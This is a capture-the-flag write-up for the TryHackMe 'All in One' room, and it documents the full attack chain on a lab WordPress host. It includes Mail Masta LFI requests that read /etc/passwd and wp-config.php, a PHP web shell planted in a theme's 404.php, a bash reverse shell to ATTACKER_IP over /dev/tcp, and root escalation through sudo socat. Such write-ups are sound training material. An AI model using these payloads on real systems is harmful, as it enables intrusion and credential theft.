# All in One

Room: https://tryhackme.com/room/allinonemj

This is a fun box where you will get to exploit the system in several ways. Few intended and unintended paths to getting user and root access.

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/allinonemj.md

---

## 1. Port scan

We started with a full TCP service scan.

```bash
nmap -sV -p- 10.67.170.92
```

Output:

```text
root@ip-10-67-71-100:~# nmap -sV -p- 10.67.170.92
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-08 09:33 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.67.170.92
Host is up (0.00027s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds
```

The attack surface was small:

- FTP on port 21
- SSH on port 22
- HTTP on port 80

## 2. Anonymous FTP

Anonymous FTP login was allowed, but the directory was empty.

```bash
ftp 10.67.170.92
```

Output:

```text
root@ip-10-67-71-100:~# ftp 10.67.170.92
Connected to 10.67.170.92.
220 (vsFTPd 3.0.5)
Name (10.67.170.92:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
226 Directory send OK.
ftp>
```

We also tested upload earlier and received `553 Could not create file`, so anonymous FTP was not useful for a shell upload.

## 3. HTTP enumeration

The root web server showed the default Apache page. Directory brute forcing found `/wordpress` and `/hackathons`.

Useful Gobuster examples:

```bash
gobuster dir -u http://10.67.170.92/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,old,zip,save,backup -t 50 --no-error
```

A deeper pass can be done with:

```bash
gobuster dir -u http://10.67.170.92/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,old,zip,save,backup,swp,sql,tar,gz,7z,rar -t 50 --no-error
```

Interesting result:

```text
/hackathons           (Status: 200) [Size: 197]
/wordpress            (Status: 301) [--> http://10.67.170.92/wordpress/]
```

The `/hackathons` page contained a clue in the HTML source.

```html
<html>
<body>
<h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!</h1>
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
</body>
</html>
```

The word `Vinegar` was a hint for a Vigenere cipher.

- Ciphertext: `Dvc W@iyur@123`
- Key: `KeepGoing`
- Decrypted text: `Try xxxxxxx`

In practice, the useful WordPress password was the shorter part:

```text
xxxxxxx
```

## 4. WordPress enumeration

WPScan showed WordPress 5.5.1, the `twentytwenty` theme, and the user `elyana`.

```bash
wpscan --url http://10.67.170.92/wordpress/ --enumerate u,p,t,tt --plugins-detection aggressive
```

Important findings from our scan:

```text
[+] WordPress version 5.5.1 identified
[+] WordPress theme in use: twentytwenty
[+] User(s) Identified:

[+] elyana
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

The scan output we reviewed did not initially show Mail Masta clearly in our pasted scan snippet, but the plugin was present and vulnerable on the box. Public writeups also confirm Mail Masta as the intended vulnerable plugin.

## 5. Mail Masta LFI

The vulnerable endpoint was:

```text
/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=
```

Test with `/etc/passwd`:

```bash
curl -s 'http://10.67.170.92/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'
```

This confirmed local file inclusion.

### Reading PHP source with a filter

A direct include of `wp-config.php` can return blank because PHP executes it rather than printing the source. Use `php://filter` to base64 encode the file.

```bash
curl -s 'http://10.67.170.92/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php' -o wpconfig.b64

base64 -d wpconfig.b64
```

Recovered config values:

```php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'elyana' );
define( 'DB_PASSWORD', 'xxxxxxx' );
define( 'DB_HOST', 'localhost' );
```

This password was valid for WordPress login as `elyana`.

## 6. WordPress login issue and confirmation

The browser login was flaky for us. Curl proved the credentials were accepted because WordPress returned authenticated cookies.

```bash
curl -i -s -b cookies.txt -c cookies.txt \
  -X POST 'http://10.67.170.92/wordpress/wp-login.php' \
  --data-urlencode 'log=elyana' \
  --data-urlencode 'pwd=xxxxxxx' \
  --data-urlencode 'wp-submit=Log In' \
  --data-urlencode 'redirect_to=http://10.67.170.92/wordpress/wp-admin/' \
  --data-urlencode 'testcookie=1'
```

Relevant output:

```text
Set-Cookie: wordpress_...=elyana...; path=/wordpress/wp-content/plugins; HttpOnly
Set-Cookie: wordpress_...=elyana...; path=/wordpress/wp-admin; HttpOnly
Set-Cookie: wordpress_logged_in_...=elyana...; path=/wordpress/; HttpOnly
```

It also showed:

```text
Error: Cookies are blocked or not supported by your browser.
```

That error caused confusion, but the auth cookies showed the credentials were accepted. If the browser loops restart the box, restarting resolved and was able to login. 


## 7. WordPress admin to command execution

After authenticating to WordPress, we used the theme editor.

Path in WordPress:

```text
Appearance -> Theme Editor -> Twenty Twenty -> 404.php
```

We added a simple command execution line near the top of `404.php`:

```php
<?php system($_GET['cmd']); ?>
```

The edited file looked like this in our notes:

```php
<?php system($_GET['cmd']); ?>

<?php
/**
 * The template for displaying the 404 template in the Twenty Twenty theme.
 *
 * @package WordPress
 * @subpackage Twenty_Twenty
 * @since Twenty Twenty 1.0
 */

get_header();
?>
```

Test command execution:

```text
http://TARGET/wordpress/wp-content/themes/twentytwenty/404.php?cmd=id
```

## 8. Reverse shell as www-data

Start a listener on the attacker machine:

```bash
nc -lvnp 4444
```

Trigger the reverse shell from the edited theme file. Replace `ATTACKER_IP` with your VPN IP.

```text
http://TARGET/wordpress/wp-content/themes/twentytwenty/404.php?cmd=bash -c 'bash -i >%26 /dev/tcp/ATTACKER_IP/4444 0>%261'
```

Our listener received a shell:

```text
pingu@nootnoot:/opt$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.67.135.25 40444
bash: cannot set terminal process group (943): Inappropriate ioctl for device
bash: no job control in this shell
<www/html/wordpress/wp-content/themes/twentytwenty$
```

Current user:

```bash
whoami
```

Expected:

```text
www-data
```

## 9. Enumerating Elyana's home

In `/home/elyana`, the user flag was present but not readable by `www-data`.

```bash
cd /home/elyana
ls -la
cat hint.txt
cat user.txt
```

Output:

```text
www-data@ip-10-67-135-25:/home/elyana$ ls -la
total 48
drwxr-xr-x 6 elyana elyana 4096 Oct  7  2020 .
drwxr-xr-x 4 root   root   4096 May  8 11:03 ..
-rw------- 1 elyana elyana 1632 Oct  7  2020 .bash_history
-rw-r--r-- 1 elyana elyana  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elyana elyana 3771 Apr  4  2018 .bashrc
drwx------ 2 elyana elyana 4096 Oct  5  2020 .cache
drwxr-x--- 3 root   root   4096 Oct  5  2020 .config
drwx------ 3 elyana elyana 4096 Oct  5  2020 .gnupg
drwxrwxr-x 3 elyana elyana 4096 Oct  5  2020 .local
-rw-r--r-- 1 elyana elyana  807 Apr  4  2018 .profile
-rw-r--r-- 1 elyana elyana    0 Oct  5  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 elyana elyana   59 Oct  6  2020 hint.txt
-rw------- 1 elyana elyana   61 Oct  6  2020 user.txt
www-data@ip-10-67-135-25:/home/elyana$ cat hint.txt
Elyana's user password is hidden in the system. Find it ;)
www-data@ip-10-67-135-25:/home/elyana$ cat user.txt
cat: user.txt: Permission denied
```

The hint told us to find Elyana's real system password.

## 10. Finding Elyana's system password

Search for readable files owned by `elyana`:

```bash
find / -user elyana -type f -readable -ls 2>/dev/null
```

Output:

```text
www-data@ip-10-67-135-25:/var/www/html/wordpress$ find / -user elyana -type f -readable -ls 2>/dev/null
   268462      4 -rw-r--r--   1 elyana   elyana        220 Apr  4  2018 /home/elyana/.bash_logout
   268579      4 -rw-rw-r--   1 elyana   elyana         59 Oct  6  2020 /home/elyana/hint.txt
   268516      4 -rw-r--r--   1 elyana   elyana        807 Apr  4  2018 /home/elyana/.profile
   269805      0 -rw-r--r--   1 elyana   elyana          0 Oct  5  2020 /home/elyana/.sudo_as_admin_successful
   268546      4 -rw-r--r--   1 elyana   elyana       3771 Apr  4  2018 /home/elyana/.bashrc
   291777      4 -rwxrwxrwx   1 elyana   elyana         34 Oct  5  2020 /etc/mysql/conf.d/private.txt
```

Read the interesting file:

```bash
cat /etc/mysql/conf.d/private.txt
```

Output:

```text
user: elyana
password: XXXXXXX
```

This was Elyana's Linux password.

## 11. User shell and user flag

Use the recovered password with `su` or SSH.

```bash
su elyana
```

or:

```bash
ssh elyana@TARGET
```

Then read `user.txt`:

```bash
cat /home/elyana/user.txt
```

Output from our notes:

```text
elyana@ip-10-67-135-25:~$ cat user.txt
VEhNezQ5amc2xxxxxxxxxxxxxxxxxxxxxxmFsYjVlNzZzaHJ1c259
```

The flag was base64 encoded:

```bash
echo 'VEhNezQ5amc2xxxxxxxxxxxxxxxxxxxxxxmFsYjVlNzZzaHJ1c259' | base64 -d
```

Decoded value redacted:

```text
THM{REDACTED_USER_FLAG}
```

## 12. Privilege escalation with sudo socat

Check sudo permissions:

```bash
sudo -l
```

Output:

```text
elyana@ip-10-67-135-25:~$ sudo -l
Matching Defaults entries for elyana on ip-10-67-135-25:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on ip-10-67-135-25:
    (ALL) NOPASSWD: /usr/bin/socat
```

Since `socat` can execute a program and attach it to a PTY, we used it to spawn a root shell.

```bash
sudo /usr/bin/socat - exec:/bin/sh,pty,ctty,raw,echo=0
```

Output:

```text
elyana@ip-10-67-135-25:~$ sudo /usr/bin/socat - exec:/bin/sh,pty,ctty,raw,echo=0
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

Read the root flag:

```bash
cd /root
ls
cat root.txt
```

Output from our notes:

```text
# cd /root
# ls
root.txt  snap
# cat root.txt
VEhNe3VlbTJ3aWdidxxxxxxxxxxxxxxb3NwaTg2OHNuMmoxb3NwaTh9
```

Decode it:

```bash
echo 'VEhNe3VlbTJ3aWdidxxxxxxxxxxxxxxb3NwaTg2OHNuMmoxb3NwaTh9' | base64 -d
```

Decoded value redacted:

```text
THM{REDACTED_ROOT_FLAG}
```

## Cleanup note

If this were not a CTF target, we would avoid leaving modified WordPress theme files behind. For room notes, record that `404.php` was modified to include:

```php
<?php system($_GET['cmd']); ?>
```

## Final attack chain

```text
Nmap finds FTP, SSH, HTTP
Anonymous FTP is empty
Gobuster finds /wordpress and /hackathons
/hackathons gives Vigenere clue
WPScan identifies WordPress and user elyana
Mail Masta LFI reads /etc/passwd
php://filter reads wp-config.php
wp-config.php reveals WordPress/database credential
Login to WordPress as elyana
Edit Twenty Twenty 404.php for command execution
Trigger reverse shell as www-data
Read /home/elyana/hint.txt
Find readable file owned by elyana at /etc/mysql/conf.d/private.txt
Use recovered Linux password for elyana
Read user flag
sudo -l shows NOPASSWD socat
Use sudo socat to spawn root shell
Read root flag
```

